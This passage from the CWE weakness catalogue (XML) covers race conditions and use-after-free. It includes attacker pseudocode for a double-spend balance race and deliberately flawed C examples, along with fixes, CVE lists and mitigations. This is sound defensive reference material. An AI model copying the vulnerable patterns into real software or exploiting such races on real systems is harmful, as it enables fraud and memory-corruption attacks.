               <Example_Code Nature="Attack" Language="Other">
                  <xhtml:div>In the following pseudocode, the attacker makes two simultaneous calls of the program, CALLER-1 and CALLER-2. Both callers are for the same user account.<xhtml:br/>CALLER-1 (the attacker) is associated with PROGRAM-1 (the instance that handles CALLER-1). CALLER-2 is associated with PROGRAM-2.<xhtml:br/>CALLER-1 makes a transfer request of 80.00.<xhtml:br/>PROGRAM-1 calls GetBalanceFromDatabase and sets $balance to 100.00<xhtml:br/>PROGRAM-1 calculates $newbalance as 20.00, then calls SendNewBalanceToDatabase().<xhtml:br/>Due to high server load, the PROGRAM-1 call to SendNewBalanceToDatabase() encounters a delay.<xhtml:br/>CALLER-2 makes a transfer request of 1.00.<xhtml:br/>PROGRAM-2 calls GetBalanceFromDatabase() and sets $balance to 100.00. This happens because the previous PROGRAM-1 request was not processed yet.<xhtml:br/>PROGRAM-2 determines the new balance as 99.00.<xhtml:br/>After the initial delay, PROGRAM-1 commits its balance to the database, setting it to 20.00.<xhtml:br/>PROGRAM-2 sends a request to update the database, setting the balance to 99.00</xhtml:div>
               </Example_Code>
               <Body_Text>At this stage, the attacker should have a balance of 19.00 (due to 81.00 worth of transfers), but the balance is 99.00, as recorded in the database.</Body_Text>
               <Body_Text>To prevent this weakness, the programmer has several options, including using a lock to prevent multiple simultaneous requests to the web application, or using a synchronization mechanism that includes all the code between GetBalanceFromDatabase() and SendNewBalanceToDatabase().</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-24">
               <Intro_Text>The following function attempts to acquire a lock in order to perform operations on a shared resource.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>void f(pthread_mutex_t *mutex) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>pthread_mutex_lock(mutex);<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>/* access shared resource */</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:br/>pthread_mutex_unlock(mutex);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, the code does not check the value returned by pthread_mutex_lock() for errors. If pthread_mutex_lock() cannot acquire the mutex for any reason, the function may introduce a race condition into the program and result in undefined behavior.</Body_Text>
               <Body_Text>In order to avoid data races, correctly written programs must check the result of thread synchronization functions and appropriately handle all errors, either by attempting to recover from them or reporting them to higher levels.</Body_Text>
               <Example_Code Nature="Good" Language="C">
                  <xhtml:div>int f(pthread_mutex_t *mutex) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>int result;<xhtml:br/>
                           <xhtml:br/>result = pthread_mutex_lock(mutex);<xhtml:br/>if (0 != result)<xhtml:div style="margin-left:1em;">return result;</xhtml:div>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>/* access shared resource */</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:br/>return pthread_mutex_unlock(mutex);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-132">
	       <Intro_Text>Suppose a processor's Memory Management Unit (MMU) has 5 other shadow MMUs to distribute its workload for its various cores. Each MMU has the start address and end address of "accessible" memory. Any time this accessible range changes (as per the processor's boot status), the main MMU sends an update message to all the shadow MMUs.</Intro_Text>
	       <Body_Text>Suppose the interconnect fabric does not prioritize such "update" packets over other general traffic packets. This introduces a race condition. If an attacker can flood the target with enough messages so that some of those attack packets reach the target before the new access ranges gets updated, then the attacker can leverage this scenario.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-29527</Reference>
               <Description>Go application for cloud management creates a world-writable sudoers file that allows local attackers to inject sudo rules and escalate privileges to root by winning a race condition.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29527</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-1782</Reference>
               <Description>Chain: improper locking (CWE-667) leads to race condition (CWE-362), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-1782</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-0920</Reference>
               <Description>Chain: mobile platform race condition (CWE-362) leading to use-after-free (CWE-416), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-0920</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-6819</Reference>
               <Description>Chain: race condition (CWE-362) leads to use-after-free (CWE-416), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-6819</Link>
            </Observed_Example>
           <Observed_Example>
             <Reference>CVE-2019-18827</Reference>
             <Description>chain: JTAG interface is not disabled (CWE-1191) during ROM code execution, introducing a race condition (CWE-362) to extract encryption keys</Description>
             <Link>https://www.cve.org/CVERecord?id=CVE-2019-18827</Link>
           </Observed_Example>
            <Observed_Example>
            <Reference>CVE-2019-1161</Reference>
            <Description>Chain: race condition (CWE-362) in anti-malware product allows deletion of files by creating a junction (CWE-1386) and using hard links during the time window in which a temporary file is created and deleted.</Description>
            <Link>https://www.cve.org/CVERecord?id=CVE-2019-1161</Link>
            </Observed_Example>
            <Observed_Example>
            <Reference>CVE-2015-1743</Reference>
            <Description>TOCTOU in sandbox process allows installation of untrusted browser add-ons by replacing a file after it has been verified, but before it is executed</Description>
            <Link>https://www.cve.org/CVERecord?id=CVE-2015-1743</Link>
            </Observed_Example>
            <Observed_Example>
            <Reference>CVE-2014-8273</Reference>
            <Description>Chain: chipset has a race condition (CWE-362) between when an interrupt handler detects an attempt to write-enable the BIOS (in violation of the lock bit), and when the handler resets the write-enable bit back to 0, allowing attackers to issue BIOS writes during the timing window [REF-1237].</Description>
            <Link>https://www.cve.org/CVERecord?id=CVE-2014-8273</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5044</Reference>
               <Description>Race condition leading to a crash by calling a hook removal procedure while other activities are occurring at the same time.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5044</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2958</Reference>
               <Description>chain: time-of-check time-of-use (TOCTOU) race condition in program allows bypass of protection mechanism that was designed to prevent symlink attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2958</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1570</Reference>
               <Description>chain: time-of-check time-of-use (TOCTOU) race condition in program allows bypass of protection mechanism that was designed to prevent symlink attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1570</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0058</Reference>
               <Description>Unsynchronized caching operation enables a race condition that causes messages to be sent to a deallocated object.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0058</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0379</Reference>
               <Description>Race condition during initialization triggers a buffer overflow.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0379</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-6599</Reference>
               <Description>Daemon crash by quickly performing operations and undoing them, which eventually leads to an operation that does not acquire a lock.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-6599</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-6180</Reference>
               <Description>chain: race condition triggers NULL pointer dereference</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-6180</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5794</Reference>
               <Description>Race condition in library function could cause data to be sent to the wrong process.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5794</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-3970</Reference>
               <Description>Race condition in file parser leads to heap corruption.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-3970</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5021</Reference>
               <Description>chain: race condition allows attacker to access an object while it is still being initialized, causing software to access uninitialized memory.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5021</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4895</Reference>
               <Description>chain: race condition for an argument value, possibly resulting in NULL dereference</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-4895</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3547</Reference>
               <Description>chain: race condition might allow resource to be released before operating on it, leading to NULL dereference</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3547</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-5051</Reference>
               <Description>Chain: Signal handler contains too much functionality (CWE-828), introducing a race condition (CWE-362) that leads to a double free (CWE-415).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-5051</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Race Conditions</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>VNA03-J</Entry_ID>
               <Entry_Name>Do not assume that a group of calls to independently atomic methods is atomic</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="26"/>
            <Related_Attack_Pattern CAPEC_ID="29"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 13: Race Conditions.&#34; Page 205"/>
            <Reference External_Reference_ID="REF-349"/>
            <Reference External_Reference_ID="REF-350"/>
            <Reference External_Reference_ID="REF-351"/>
            <Reference External_Reference_ID="REF-352"/>
            <Reference External_Reference_ID="REF-353"/>
            <Reference External_Reference_ID="REF-354"/>
            <Reference External_Reference_ID="REF-355"/>
            <Reference External_Reference_ID="REF-356"/>
            <Reference External_Reference_ID="REF-357"/>
            <Reference External_Reference_ID="REF-76"/>
	    <Reference External_Reference_ID="REF-1237"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Maintenance">The relationship between race conditions and synchronization problems (CWE-662) needs to be further developed. They are not necessarily two perspectives of the same core concept, since synchronization is only one technique for avoiding race conditions, and synchronization can be used for other purposes besides race condition prevention.</Note>
            <Note Type="Research Gap">Race conditions in web applications are under-studied and probably under-reported. However, in 2008 there has been growing interest in this area.</Note>
            <Note Type="Research Gap">Much of the focus of race condition research has been in Time-of-check Time-of-use (TOCTOU) variants (CWE-367), but many race conditions are related to synchronization problems that do not necessarily require a time-of-check.</Note>
            <Note Type="Research Gap">From a classification/taxonomy perspective, the relationships between concurrency and program state need closer investigation and may be useful in organizing related issues.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Maintenance_Notes, Observed_Examples, Potential_Mitigations, References, Relationships, Research_Gaps</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Detection_Factors, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Name, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Research_Gaps, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Common_Consequences, Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>Martin Sebor</Contribution_Name>
               <Contribution_Organization>Cisco Systems, Inc.</Contribution_Organization>
               <Contribution_Date>2010-04-30</Contribution_Date>
               <Contribution_Comment>Provided Demonstrative Example</Contribution_Comment>
            </Contribution>
            <Previous_Entry_Name Date="2008-04-11">Race Conditions</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-12-13">Race Condition</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="416" Name="Use After Free" Abstraction="Variant" Structure="Simple" Status="Stable">
         <Description>Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.</Description>
         <Extended_Description>
            <xhtml:p>The use of previously-freed memory can have any number of adverse consequences, ranging from the corruption of valid data to the execution of arbitrary code, depending on the instantiation and timing of the flaw. The simplest way data corruption may occur involves the system's reuse of the freed memory. Use-after-free errors have two common and sometimes overlapping causes:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>Error conditions and other exceptional circumstances.</xhtml:li>
                  <xhtml:li>Confusion over which part of the program is responsible for freeing the memory.</xhtml:li>
               </xhtml:ul>
            <xhtml:p>In this scenario, the memory in question is allocated to another pointer validly at some point after it has been freed. The original pointer to the freed memory is used again and points to somewhere within the new allocation. As the data is changed, it corrupts the validly used memory; this induces undefined behavior in the process.</xhtml:p>
            <xhtml:p>If the newly allocated data happens to hold a class, in C++ for example, various function pointers may be scattered within the heap data. If one of these function pointers is overwritten with an address to valid shellcode, execution of arbitrary code can be achieved.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
             <Related_Weakness Nature="ChildOf" CWE_ID="825" View_ID="1000" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="672" View_ID="1003" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="672" View_ID="1305" Ordinal="Primary"/>
			 <Related_Weakness Nature="ChildOf" CWE_ID="672" View_ID="1340" Ordinal="Primary"/>
             <Related_Weakness Nature="CanPrecede" CWE_ID="120" View_ID="1000"/>
             <Related_Weakness Nature="CanPrecede" CWE_ID="123" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="C" Prevalence="Undetermined"/>
            <Language Name="C++" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Dangling pointer</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Use-After-Free</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Memory</Impact>
               <Note>The use of previously freed memory may corrupt valid data, if the memory area in question has been allocated and used properly elsewhere.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Note>If chunk consolidation occurs after the use of previously freed data, the process may crash when invalid data is used as chunk information.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>If malicious data is entered before chunk consolidation can take place, it may be possible to take advantage of a write-what-where primitive to execute arbitrary code.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-13">
             <Method>Fuzzing</Method>
             <Description>Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Choose a language that provides automatic memory management.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When freeing pointers, be sure to set them to NULL once they are freed. However, the utilization of multiple or complex data structures may lower the usefulness of this strategy.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="SIFT-DX-6">
               <Intro_Text>The following example demonstrates the weakness.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>#include &lt;stdio.h&gt;<xhtml:br/>#include &lt;unistd.h&gt;<xhtml:br/>#define BUFSIZER1 512<xhtml:br/>#define BUFSIZER2 ((BUFSIZER1/2) - 8)<xhtml:br/>int main(int argc, char **argv) {<xhtml:div style="margin-left:1em;">char *buf1R1;<xhtml:br/>char *buf2R1;<xhtml:br/>char *buf2R2;<xhtml:br/>char *buf3R2;<xhtml:br/>buf1R1 = (char *) malloc(BUFSIZER1);<xhtml:br/>buf2R1 = (char *) malloc(BUFSIZER1);<xhtml:br/>free(buf2R1);<xhtml:br/>buf2R2 = (char *) malloc(BUFSIZER2);<xhtml:br/>buf3R2 = (char *) malloc(BUFSIZER2);<xhtml:br/>strncpy(buf2R1, argv[1], BUFSIZER1-1);<xhtml:br/>free(buf1R1);<xhtml:br/>free(buf2R2);<xhtml:br/>free(buf3R2);</xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="SIFT-DX-7">
               <Intro_Text>The following code illustrates a use after free error:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>char* ptr = (char*)malloc (SIZE);<xhtml:br/>if (err) {<xhtml:div style="margin-left:1em;">abrt = 1;<xhtml:br/>free(ptr);</xhtml:div>}<xhtml:br/>...<xhtml:br/>if (abrt) {<xhtml:div style="margin-left:1em;">logError("operation aborted before commit", ptr);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>When an error occurs, the pointer is immediately freed. However, this pointer is later incorrectly used in the logError function.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
	    <Observed_Example>
               <Reference>CVE-2022-20141</Reference>
               <Description>Chain: an operating system kernel has insufficent resource locking (CWE-413) leading to a use after free (CWE-416).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-20141</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-2621</Reference>
               <Description>Chain: two threads in a web browser use the same resource (CWE-366), but one of those threads can destroy the resource before the other has completed (CWE-416).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-2621</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-0920</Reference>
               <Description>Chain: mobile platform race condition (CWE-362) leading to use-after-free (CWE-416), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-0920</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-6819</Reference>
               <Description>Chain: race condition (CWE-362) leads to use-after-free (CWE-416), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-6819</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-4168</Reference>
               <Description>Use-after-free triggered by closing a connection while data is still being transmitted.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-4168</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-2941</Reference>
               <Description>Improper allocation for invalid data leads to use-after-free.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-2941</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-2547</Reference>
               <Description>certificate with a large number of Subject Alternate Names not properly handled in realloc, leading to use-after-free</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-2547</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-1772</Reference>
               <Description>Timers are not disabled when a related object is deleted</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-1772</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-1437</Reference>
               <Description>Access to a "dead" object that is being cleaned up</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-1437</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-1208</Reference>
               <Description>object is deleted even with a non-zero reference count, and later accessed</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-1208</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-0629</Reference>
               <Description>use-after-free involving request containing an invalid version number</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-0629</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-0378</Reference>
               <Description>unload of an object that is currently being accessed by other functionality</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-0378</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-0302</Reference>
               <Description>incorrectly tracking a reference count leads to use-after-free</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-0302</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-0249</Reference>
               <Description>use-after-free related to use of uninitialized memory</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-0249</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-0050</Reference>
               <Description>HTML document with incorrectly-nested tags</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-0050</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3658</Reference>
               <Description>Use after free in ActiveX object by providing a malformed argument to a method</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3658</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3616</Reference>
               <Description>use-after-free by disconnecting during data transfer, or a message containing incorrect data types</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3616</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3553</Reference>
               <Description>disconnect during a large data transfer causes incorrect reference count, leading to use-after-free</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3553</Link>
            </Observed_Example>
            <Observed_Example>
